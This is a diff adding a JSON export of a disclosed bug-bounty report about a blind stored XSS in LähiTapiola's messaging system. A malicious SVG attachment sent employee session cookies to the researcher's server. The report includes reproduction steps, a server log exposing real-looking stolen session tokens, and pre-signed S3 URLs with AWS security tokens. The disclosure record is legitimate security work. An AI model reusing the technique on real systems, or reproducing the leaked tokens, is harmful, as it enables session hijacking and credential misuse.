@@ -1,0 +1,908 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-02-22T11:24:45.050Z", 
+    "voters": [
+        "delimitry", 
+        "putsi", 
+        "sp1d3rs", 
+        "derision", 
+        "michiel", 
+        "bl4de", 
+        "woltage", 
+        "hunter", 
+        "shailesh4594", 
+        "fillawful", 
+        "and 47 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "3000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 159498, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-02-22T11:17:15.299Z", 
+    "vulnerability_information": "Hi,\nI am pretty sure that I found a vulnerability similar to https://hackerone.com/reports/135154.\n\nAn adversary can use the \"L\u00e4het\u00e4 viesti\"-functionality of the L\u00e4hiTapiola Asiakassalkku to send a malicious file. When the customer service opens the file, an XSS will execute and will leak user IP address and L\u00e4hitapiola session cookies and also for example the \"tapiola.cem.uid\" which I suspect is the username of the employee (e.g. \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\").\n\n## Steps to reproduce:\n1. Log in to the L\u00e4hitapiola customer site (https://www.lahitapiola.fi/henkilo/asiakaspalvelu/asioi-verkossa/kirjaudu-verkkoon).\n2. Navigate to the \"L\u00e4het\u00e4 viesti\"-page (https://verkkopalvelu.tapiola.fi/a2/AskoWeb/faces/sivut/viesti/laheta.xhtml).\n3. Fill the fields with anything you want and click the \"Lataa liite\"-button and upload a malicious file (see the attached file kirje.txt).\n4. Send the message.\n5. Navigate to \"Postilaatikko\" and make sure that the message was sent and that the attachment is properly uploaded (see the attached image1.png and image2.png).\n6. The attached kirje.txt contains a SVG image file which is modified to contain malicious javascript that sends an AJAX-request to attacker's server (mine) and adds website cookies to the URL as GET-parameter. As the L\u00e4hitapiola employees are probably using Internet Explorer, the IE will sniff the MIME type from the file and open it as SVG instead of text/plain and it will trigger the XSS.\n\n## Proof of exploitation\nSee the attacked file xsspoc.txt for an proof. The file is from my nginx-server logs and in the file you can see that an Lahitapiola employee (notice the IP-address) has opened the attachment and it triggered the XSS which sent the employees cookies to my server. ", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "low", 
+            "user_interaction": "required", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "high", 
+            "availability": "high"
+        }, 
+        "rating": "critical", 
+        "score": 9.0, 
+        "author_type": "User"
+    }, 
+    "title": "Blind Stored XSS Against Lahitapiola Employees - Session and Information leakage", 
+    "is_member_of_team?": null, 
+    "vote_count": 57, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 3311, 
+            "content": "##Issue\n\nThe reporter was able to perform a Blind Stored XSS against the secure messaging system for LocalTapiola customers. The stored (or persistent) XSS vulnerability is a more devastating variant of a cross-site scripting flaw: it occurs when the data provided by the attacker is saved by the server, and then permanently displayed on \"normal\" pages returned to other users (or employees as was the case here) in the course of regular browsing. \n\nThe reporter was able to inject the attack in such a way that he was able to gather session tokens and potentially other information from the employee sessions (or browsers). In addition to this, the attacker could extract customer information from other customers. \n\nThe attack required a valid user session, which in many ways made this attack harder to perform.\n\n##Fix\n\nThe attack involved sending an attachment as a payload. The sanitization of this was not very straightforward and hence the fix was carefully designed and audited before deploying the fix.\n\n##Reasoning\n\nThe flaw in the application was bad, but not critical as the attack required the attacker to have a valid session (by using Tupas-identification). The fact that the flaw could be exploited to actually extract customer data did however make the finding very serious. The reporter provided much needed information during the investigation and also participated in the testing and verification of the fix. ", 
+            "content_html": "<h2 id=\"issue\">Issue</h2>\n\n<p>The reporter was able to perform a Blind Stored XSS against the secure messaging system for LocalTapiola customers. The stored (or persistent) XSS vulnerability is a more devastating variant of a cross-site scripting flaw: it occurs when the data provided by the attacker is saved by the server, and then permanently displayed on &quot;normal&quot; pages returned to other users (or employees as was the case here) in the course of regular browsing. </p>\n\n<p>The reporter was able to inject the attack in such a way that he was able to gather session tokens and potentially other information from the employee sessions (or browsers). In addition to this, the attacker could extract customer information from other customers. </p>\n\n<p>The attack required a valid user session, which in many ways made this attack harder to perform.</p>\n\n<h2 id=\"fix\">Fix</h2>\n\n<p>The attack involved sending an attachment as a payload. The sanitization of this was not very straightforward and hence the fix was carefully designed and audited before deploying the fix.</p>\n\n<h2 id=\"reasoning\">Reasoning</h2>\n\n<p>The flaw in the application was bad, but not critical as the attack required the attacker to have a valid session (by using Tupas-identification). The fact that the flaw could be exploited to actually extract customer data did however make the finding very serious. The reporter provided much needed information during the investigation and also participated in the testing and verification of the fix. </p>\n"
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 3426, 
+            "content": "### Public Service Announcement\nFellow hackers, please don't blindly open/execute files that you download from HackerOne reports.\n\nAfter this report was disclosed, the attached XSS payload-files have contacted my server over 50 times. I even received someone's cookies for some web service.", 
+            "content_html": "<h3 id=\"public-service-announcement\">Public Service Announcement</h3>\n\n<p>Fellow hackers, please don&#39;t blindly open/execute files that you download from HackerOne reports.</p>\n\n<p>After this report was disclosed, the attached XSS payload-files have contacted my server over 50 times. I even received someone&#39;s cookies for some web service.</p>\n"
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-03-24T11:17:15.334Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$3,000", 
+    "attachments": [
+        {
+            "file_name": "kirje.txt", 
+            "type": "text/html", 
+            "id": 112342, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/112/342/1af66c5bb69b63cd071b8f7373f5bcfc904c5c4e/kirje.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224311Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=fb9f04af183447977d55d5b2367ec5b39418a1751c5497630fbd07357c75c018"
+        }, 
+        {
+            "file_name": "image2.png", 
+            "type": "image/png", 
+            "id": 112343, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/112/343/e1886f7d6eebd4b02c46d9cc101e9a806b711640/image2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224311Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1c87582359bc43b823d6a216664d3b0676ad28839f3848c339db2ed6e69f2763"
+        }, 
+        {
+            "file_name": "image1.png", 
+            "type": "image/png", 
+            "id": 112344, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/112/344/43082dab1fcc74301e9d301e900f5a9ddd04365f/image1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224311Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5655ea1c40b26574bad5c3e063c52615892e790f7ce5581dd9975fd86117b860"
+        }
+    ], 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2016-08-15T15:50:56.543Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-22T13:22:13.564Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "In the xsspoc.txt you can also see that the employee used some kind of intranet website that is not accessible through internet (https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.tapiola.fi/a2/VerkaFileLoaderWeb/rest/files/30fe1c28-4c4f-4f2c-bb3c-eae59ec7b42c).\n\nFollowing cookies were stolen and can be viewed in the xsspoc.txt:\n* AMWEBJCT!/Fa2!tapiola.cem.uid\n* AMWEBJCT!/a2!LtpaToken2\n* AMWEBJCT!/a2/JSESSIONID\n* PD-ID\n* PH-H-SESSION-ID\n* AMCV_8041A77B5656DBF07F000101@AdobeOrg\n* BIGipServerahiTapiola_bigipint1~\u2588\u2588\u2588\u2588\u2588.tapiola.fi.app~\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.tapiola.fi_pool\n* PD_STATEFUL_94f11ff8-3bf8-11e0-b907-00145e810614\n* IV_JCT\n* __utma\n* __utmz", 
+            "markdown_message": "<p>In the xsspoc.txt you can also see that the employee used some kind of intranet website that is not accessible through internet (https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.tapiola.fi/a2/VerkaFileLoaderWeb/rest/files/30fe1c28-4c4f-4f2c-bb3c-eae59ec7b42c).</p>\n\n<p>Following cookies were stolen and can be viewed in the xsspoc.txt:</p>\n\n<ul>\n<li>AMWEBJCT!/Fa2!tapiola.cem.uid</li>\n<li>AMWEBJCT!/a2!LtpaToken2</li>\n<li>AMWEBJCT!/a2/JSESSIONID</li>\n<li>PD-ID</li>\n<li>PH-H-SESSION-ID</li>\n<li>AMCV_8041A77B5656DBF07F000101@AdobeOrg</li>\n<li>BIGipServerahiTapiola_bigipint1~\u2588\u2588\u2588\u2588\u2588.tapiola.fi.app~\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.tapiola.fi_pool</li>\n<li>PD_STATEFUL_94f11ff8-3bf8-11e0-b907-00145e810614</li>\n<li>IV_JCT</li>\n<li>__utma</li>\n<li>__utmz</li>\n</ul>\n", 
+            "type": "Activities::Comment", 
+            "id": 1127228, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-08-15T17:00:37.490Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-22T13:22:13.558Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "As I mentioned in the previous comment, the \u2588\u2588\u2588\u2588\u2588\u2588\u2588-subdomain seems to be only accessible from the intranet.\nHowever it seems that the VerkaFileLoaderWeb-app of the \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588-subdomain (and possibly also all other apps of the  \u2588\u2588\u2588\u2588\u2588\u2588-subdomain) can be accessed also from the verkkopalvelu-subdomain (e.g. https://verkkopalvelu.tapiola.fi/a2/VerkaFileLoaderWeb/rest/files/30fe1c28-4c4f-4f2c-bb3c-eae59ec7b42c). Thus, I suspect that an adversary can use the stolen cookies to log in as a Lahitapiola-employee through the verkkopalvelu-subdomain even when the cookies are from the intranet \u2588\u2588\u2588-subdomain.", 
+            "markdown_message": "<p>As I mentioned in the previous comment, the \u2588\u2588\u2588\u2588\u2588\u2588\u2588-subdomain seems to be only accessible from the intranet.<br>\nHowever it seems that the VerkaFileLoaderWeb-app of the \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588-subdomain (and possibly also all other apps of the  \u2588\u2588\u2588\u2588\u2588\u2588-subdomain) can be accessed also from the verkkopalvelu-subdomain (e.g. <a title=\"https://verkkopalvelu.tapiola.fi/a2/VerkaFileLoaderWeb/rest/files/30fe1c28-4c4f-4f2c-bb3c-eae59ec7b42c\" href=\"/redirect?signature=0dae5391b546786a310334c56f3a8db37447fb86&amp;url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fa2%2FVerkaFileLoaderWeb%2Frest%2Ffiles%2F30fe1c28-4c4f-4f2c-bb3c-eae59ec7b42c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://verkkopalvelu.tapiola.fi/a2/VerkaFileLoaderWeb/rest/files/30fe1c28-4c4f-4f2c-bb3c-eae59ec7b42c</span><i class=\"icon-external-link\"></i></a>). Thus, I suspect that an adversary can use the stolen cookies to log in as a Lahitapiola-employee through the verkkopalvelu-subdomain even when the cookies are from the intranet \u2588\u2588\u2588-subdomain.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1127367, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-08-16T19:26:13.024Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-08-16T19:30:30.574Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "I have previously mentioned the possibility of XSS on this report: https://hackerone.com/reports/139589.\nHowever that report is about completely different issue (CSRF-vulnerability) so for the sake of clarity I suggest that all discussion about the XSS should be done on this report in the future.", 
+            "markdown_message": "<p>I have previously mentioned the possibility of XSS on this report: <a title=\"https://hackerone.com/reports/139589\" href=\"https://hackerone.com/reports/139589\">https://hackerone.com/reports/139589</a>.<br>\nHowever that report is about completely different issue (CSRF-vulnerability) so for the sake of clarity I suggest that all discussion about the XSS should be done on this report in the future.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1130205, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-08-17T05:38:19.820Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-08-17T05:38:19.820Z", 
+            "actor": {
+                "username": "localtapiola-thomas", 
+                "url": "/localtapiola-thomas", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.", 
+            "markdown_message": "<p>Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.</p>\n\n<p>Our security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1131146, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-09-12T11:19:01.245Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-22T13:22:13.543Z", 
+            "actor": {
+                "username": "putsi", 
+                "url": "/putsi", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "localtapiola", 
+            "message": "Hi,\n\nI retested this and I can still execute the XSS-attack. \nThe following log entry contains result of an attack where user from IP `193.209.71.2` (resolves to hostname ` users.tapiola.fi`) sent browser cookies to my server:\n```\n193.209.71.2 - - [12/Sep/2016:03:26:22 -0400] \"GET /tapiolaviesti?cook=PD-H-SESSION-ID=4_1_j9Ev2UwKuPj9vkVXswPu-3uP0OSTT422ZF3LxklT25S+8wkV;%20BIGipServer~LahiTapiola_bigipint1~\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.tapiola.fi.app~\u2588\u2588\u2588\u2588.tapiola.fi_pool=rd2o00000000000000000000ffffc0a8e0b6o80;%20AMWEBJCT!%2Fa2!LtpaToken2=drR2RpmKlaOPGN55oqES0VAtEh5FyI8FxZuhXPEupL8RIADiwU8gtJKLkoTzIw86U1SRvju0dZ3dJh2A2Gsgl4j/M5VBCgcP5OgTUeThBNel+s2qHz5srNj2lwLmZkgJXl/+rBMeo79Toiq5E5BcEvVEVxDGfrPhBxpn35GEZDSOpoSwHkK7HtRcPKphBYp6IaZAkgYP1vw0pAXIT1CKVQAAT9k6/sfPFQnsnEn2/JyxSfl5ZeZH6d8Ron5Ovwy1hCz3hF4MUjqK0M41CP4yvQw/ZDW1V+WCqpM73YlwJutm1pz6LnnY++GO3CwGXyNnsVyNHWuJ12HYiSwQg4HfD1I/yd+hFUlo44hsLF7h+VmNRx1VwU8vpwxQ1YcYFd+3rUA8kYdUsucAsGpP3lnPjS2sCezT25u/EtITGNk0LQPJvyY84yYdsGVD6TrXZHc+lMdQMATJ+LieuhsDy21LVVq10ERXQJUCd7DxVgPI1SChtKsVYdCivulGdNZ19XjHO9D395AYUPZTO5gRcV5UereM8PFHV8ozs9CrOf9oFfrD2KybKEk7gh/X7rCnzccQ1cSbMy8EVIS7eZfd91zqPezgDJK+As7GE4KGx4oN2fAWkEccu4wtdUsGsoojAMEakgN3hN3tlFT/KdANUcL4W0cmxLNWY1+x569+2UuWtgkImzO+sRHlEfXaaJzpX6Z6f+QVd1Bc5r+TLcdQQlWykYUbIxb1yTo6zng8Xt3rpWQ=;%20AMWEBJCT!%2Fa2!JSESSIONID=0000ucWQAJ2sWLvdHZts_DvhdbD:15mudulq4;%20PD_STATEFUL_94bcac3c-3bf8-11e0-b907-00145e810614=%2Fa2;%20PD-ID=/tIT9GkQxdy8t/ODvlsSeqiPWfFsFfJhXDmn49wTXE1UL6qomZCeT07U/peN639GOLZIrPyCRZbfk0eq/OI1Pq0mbIiEkCqWR1hPJRJgHk/aGLHHM5J7kL174ewvhhzQVlizcsD/9vBPeZOMNxrChsJnNGBzVlN649QcUb8pSVl32Cm/M/hEH6xZXhVoVvG7jszUMde7yd2q4fmvWLlXKGvLupv1BTYlOi2uzD5mcLY9COb84C9NQ7ZAPWsCIEXswInQZOIvFDRJ5oE0oe1aHsTdPMs8SHvKMYd2UgMUFgtfVCGCzKtpLKueu/K8f9QrUPTV9lddMwkM5POY54IG3g==;%20IV_JCT=%2Fa2 HTTP/1.1\" 404 1311 \"-\" \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\"\n```\n\nL\u00e4hitapiola employee cookies that were leaked this time:\n- PD-H-SESSION-ID\n- BIGipServer~LahiTapiola_bigipint1~\u2588\u2588\u2588\u2588.tapiola.fi.app~\u2588\u2588\u2588\u2588\u2588\u2588\u2588.tapiola.fi_pool\n- AMWEBJCT!/a2!LtpaToken2\n- AMWEBJCT!/a2!JSESSIONID\n- PD_STATEFUL_94bcac3c-3bf8-11e0-b907-00145e810614\n- PD-ID\n- IV_JCT\n\n", 
+            "markdown_message": "<p>Hi,</p>\n\n<p>I retested this and I can still execute the XSS-attack. <br>\nThe following log entry contains result of an attack where user from IP <code>193.209.71.2</code> (resolves to hostname <code>users.tapiola.fi</code>) sent browser cookies to my server:</p>\n<pre class=\"highlight plaintext\"><code>193.209.71.2 - - [12/Sep/2016:03:26:22 -0400] &quot;GET /tapiolaviesti?cook=PD-H-SESSION-ID=4_1_j9Ev2UwKuPj9vkVXswPu-3uP0OSTT422ZF3LxklT25S+8wkV;%20BIGipServer~LahiTapiola_bigipint1~\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.tapiola.fi.app~\u2588\u2588\u2588\u2588.tapiola.fi_pool=rd2o00000000000000000000ffffc0a8e0b6o80;%20AMWEBJCT!%2Fa2!LtpaToken2=drR2RpmKlaOPGN55oqES0VAtEh5FyI8FxZuhXPEupL8RIADiwU8gtJKLkoTzIw86U1SRvju0dZ3dJh2A2Gsgl4j/M5VBCgcP5OgTUeThBNel+s2qHz5srNj2lwLmZkgJXl/+rBMeo79Toiq5E5BcEvVEVxDGfrPhBxpn35GEZDSOpoSwHkK7HtRcPKphBYp6IaZAkgYP1vw0pAXIT1CKVQAAT9k6/sfPFQnsnEn2/JyxSfl5ZeZH6d8Ron5Ovwy1hCz3hF4MUjqK0M41CP4yvQw/ZDW1V+WCqpM73YlwJutm1pz6LnnY++GO3CwGXyNnsVyNHWuJ12HYiSwQg4HfD1I/yd+hFUlo44hsLF7h+VmNRx1VwU8vpwxQ1YcYFd+3rUA8kYdUsucAsGpP3lnPjS2sCezT25u/EtITGNk0LQPJvyY84yYdsGVD6TrXZHc+lMdQMATJ+LieuhsDy21LVVq10ERXQJUCd7DxVgPI1SChtKsVYdCivulGdNZ19XjHO9D395AYUPZTO5gRcV5UereM8PFHV8ozs9CrOf9oFfrD2KybKEk7gh/X7rCnzccQ1cSbMy8EVIS7eZfd91zqPezgDJK+As7GE4KGx4oN2fAWkEccu4wtdUsGsoojAMEakgN3hN3tlFT/KdANUcL4W0cmxLNWY1+x569+2UuWtgkImzO+sRHlEfXaaJzpX6Z6f+QVd1Bc5r+TLcdQQlWykYUbIxb1yTo6zng8Xt3rpWQ=;%20AMWEBJCT!%2Fa2!JSESSIONID=0000ucWQAJ2sWLvdHZts_DvhdbD:15mudulq4;%20PD_STATEFUL_94bcac3c-3bf8-11e0-b907-00145e810614=%2Fa2;%20PD-ID=/tIT9GkQxdy8t/ODvlsSeqiPWfFsFfJhXDmn49wTXE1UL6qomZCeT07U/peN639GOLZIrPyCRZbfk0eq/OI1Pq0mbIiEkCqWR1hPJRJgHk/aGLHHM5J7kL174ewvhhzQVlizcsD/9vBPeZOMNxrChsJnNGBzVlN649QcUb8pSVl32Cm/M/hEH6xZXhVoVvG7jszUMde7yd2q4fmvWLlXKGvLupv1BTYlOi2uzD5mcLY9COb84C9NQ7ZAPWsCIEXswInQZOIvFDRJ5oE0oe1aHsTdPMs8SHvKMYd2UgMUFgtfVCGCzKtpLKueu/K8f9QrUPTV9lddMwkM5POY54IG3g==;%20IV_JCT=%2Fa2 HTTP/1.1&quot; 404 1311 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;\n</code></pre>\n<p>L\u00e4hitapiola employee cookies that were leaked this time:</p>\n\n<ul>\n<li>PD-H-SESSION-ID</li>\n<li>BIGipServer~LahiTapiola_bigipint1~\u2588\u2588\u2588\u2588.tapiola.fi.app~\u2588\u2588\u2588\u2588\u2588\u2588\u2588.tapiola.fi_pool</li>\n<li>AMWEBJCT!/a2!LtpaToken2</li>\n<li>AMWEBJCT!/a2!JSESSIONID</li>\n<li>PD_STATEFUL_94bcac3c-3bf8-11e0-b907-00145e810614</li>\n<li>PD-ID</li>\n<li>IV_JCT</li>\n</ul>\n", 
+            "type": "Activities::Comment", 
+            "id": 1188397, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
